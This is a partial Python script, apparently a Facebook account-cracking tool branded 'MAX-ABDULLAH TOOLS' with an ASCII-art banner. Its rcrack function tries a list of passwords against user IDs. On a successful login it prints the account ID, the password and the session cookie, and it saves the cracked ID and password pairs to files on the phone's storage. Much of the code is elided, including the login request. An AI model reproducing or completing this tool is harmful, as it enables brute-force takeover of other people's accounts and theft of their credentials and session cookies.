...
logo =("""\033[1;32m
 ...
 .d8b.  d8888b. d8888b. db    db db      db       .d8b.  db   db      
d8' `8b 88  `8D 88  `8D 88    88 88      88      d8' `8b 88   88      
88ooo88 88oooY' 88   88 88    88 88      88      88ooo88 88ooo88      
88~~~88 88~~~b. 88   88 88    88 88      88      88~~~88 88~~~88      
88   88 88   8D 88  .8D 88b  d88 88booo. 88booo. 88   88 88   88      
YP   YP Y8888P' Y8888D' ~Y8888P' Y88888P Y88888P YP   YP YP   YP      
                                                                      
                                                                      

                                                                                                                                    
       ┌━━━━━━━━━━━━━━━━━ ABDULLAH ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  MOHAMMED ABDULLAH            
               \033[1;91mFACEBOK      :  Mohammed Abdullah              
               \033[1;97mGITHUB       :  AbdullahX4       
               \033[1;91mSTATUS       :   PREMIUM           
               \033[1;97mTEAM         :  MaX4 Squad                 
               \033[1;91mTOOL VIRSION :  2.00                    
               \033[1;97mTOOL WORK    :   DATA & WIFI          
      \033[1;32m └━━━━━━━━━━━━━━━━━ MAX4 SQUAD ━━━━━━━━━━━━━━━━┘""")
loop = 0
oks = []
cps = []
def linex():
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO MAX-ABDULLAH TOOLS☠️🔥')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[ABDULLAH\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[ABDULLAH-OK☠️] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/ABDULLAH-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[ABDULLAH-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/ABDULLAH-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
